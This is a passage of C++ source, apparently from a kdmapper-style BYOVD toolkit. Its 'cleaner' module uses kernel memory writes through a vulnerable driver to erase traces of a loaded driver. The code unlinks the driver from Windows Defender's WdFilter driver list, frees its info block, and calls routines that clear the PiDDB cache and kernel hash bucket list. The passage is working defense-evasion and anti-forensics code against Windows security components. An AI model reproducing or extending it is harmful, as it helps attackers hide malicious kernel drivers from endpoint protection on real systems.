        bool removedFromArray = false;
        for (int k = 0; k < 256; ++k) {
            uint64_t value = 0;
            if (!kmem::ReadU64(backend, runtimeDriversArray + k * 8, value)) break;
            if (value == sameIndexList) {
                uint64_t emptyVal = runtimeDriversCount + 1; // kdmapper: position marker, not count+1
                if (!kmem::WriteU64(backend, runtimeDriversArray + k * 8, emptyVal)) return false;
                removedFromArray = true;
                break;
            }
        }
        if (!removedFromArray) return false;

        uint64_t next = 0, prev = 0;
        if (!kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Flink), next) ||
            !kmem::ReadU64(backend, entry + offsetof(LIST_ENTRY, Blink), prev)) return false;
        if (!kmem::WriteU64(backend, next + offsetof(LIST_ENTRY, Blink), prev) ||
            !kmem::WriteU64(backend, prev + offsetof(LIST_ENTRY, Flink), next)) return false;

        uint32_t count = 0;
        if (kmem::ReadU32(backend, runtimeDriversCount, count) && count > 0) {
            count--;
            kmem::WriteU32(backend, runtimeDriversCount, count);
        }

        // Release the driver info block only when the magic matches; kdmapper
        // skips the free on mismatch to avoid a bugcheck on new WdFilter builds.
        uint64_t driverInfo = entry - 0x20;
        uint16_t magic = 0;
        if (backend->ReadKernelMemory(driverInfo, &magic, sizeof(magic)) && magic == 0xDA18) {
            kmem::Trace("cleaner: wdfilter MpFreeDriverInfoEx call");
            kmem::CallKernelFunction<void>(backend, nullptr, mpFreeDriverInfoEx, driverInfo);
        } else {
            std::wcerr << L"[hinv::cleaner] WdFilter DriverInfo magic mismatch, free skipped\n";
        }

        std::wcout << L"[hinv::cleaner] WdFilterDriverList cleaned: " << nameBuf.data() << L"\n";
        return true;
    }

    return false;
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

CleanResult CleanDriverTraces(byovd::IByovdBackend* backend, const std::wstring& driverName,
                              uint32_t driverFileTimestamp) {
    CleanResult result{};
    if (!backend) {
        result.error = L"invalid backend";
        return result;
    }

    std::wcout << L"[hinv::cleaner] Sanitizing traces for " << driverName << L"\n";
    kmem::Trace("cleaner: begin (piddb)");
    result.piDdbCache = ClearPiDddbCache(backend, driverName, driverFileTimestamp);
    kmem::Trace("cleaner: begin (hashbucket)");
    result.hashBucketList = ClearKernelHashBucketList(backend, driverName);
    kmem::Trace("cleaner: begin (wdfilter)");
    result.wdFilter = ClearWdFilterDriverList(backend, driverName);
    kmem::Trace("cleaner: all done");

    if (!result.piDdbCache && !result.hashBucketList && !result.wdFilter) {
        result.error = L"no matching entries found (already clean?) or globals not located on this build; see log";
    }
    return result;
}

} // namespace cleaner
} // namespace hinv
